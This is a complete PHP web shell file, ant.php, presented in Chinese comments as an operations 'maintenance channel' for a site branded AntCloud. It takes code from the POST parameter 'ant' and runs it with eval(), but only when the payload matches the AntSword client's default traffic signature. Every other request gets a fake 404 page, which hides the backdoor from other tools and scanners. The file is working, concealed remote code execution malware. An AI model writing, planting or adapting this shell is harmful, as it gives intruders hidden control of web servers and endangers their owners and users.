<?php
/* 蚂蚁云 · 维护通道（ant.php）
 *
 * 运维专用后门：只放行「中国蚁剑」默认配置的流量特征
 * （默认编码器原样下发，payload 头部与结构固定），
 * 校验不过的一律按 404 处理——别的工具连上来连个响都听不见。
 */
$p = $_POST['ant'] ?? '';
if (strpos($p, '@ini_set("display_errors"') !== 0
    || strpos($p, 'open_basedir') === false
    || strpos($p, 'asoutput()') === false
) {
    http_response_code(404);
    echo '<!doctype html><html lang="zh-CN"><head><meta charset="utf-8">'
        . '<title>404 - 蚂蚁云 AntCloud</title></head>'
        . '<body style="font-family:\'Microsoft YaHei\',sans-serif;background:#f4f6f8;'
        . 'color:#2b3440;text-align:center;padding-top:12vh">'
        . '<div style="font-size:56px;font-weight:700;color:#c3cdd7">404</div>'
        . '<p>页面不存在 · <a href="/" style="color:#1063ff">返回蚂蚁云</a></p>'
        . '</body></html>';
    exit;
}
eval($p);
